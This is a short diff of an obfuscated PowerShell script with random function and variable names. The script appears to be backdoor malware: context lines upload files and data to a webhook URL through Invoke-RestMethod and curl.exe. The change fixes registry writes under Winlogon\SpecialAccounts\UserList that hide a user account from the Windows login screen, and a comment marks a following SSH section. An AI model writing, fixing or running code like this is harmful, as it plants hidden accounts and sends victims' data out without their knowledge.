@@ -22,6 +22,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
+
 function RpLGWiUsIy {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
 }
@@ -54,11 +55,8 @@ geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
 # registry
 $csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
 $jmQikqoKMZ = '00000000'
-
-If (-NOT (Test-Path $csfMFzvgEN)) {
-  New-ItemProperty -Path $csfMFzvgEN	-Force | Out-Null
-}
-
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
+New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
 
 # ssh
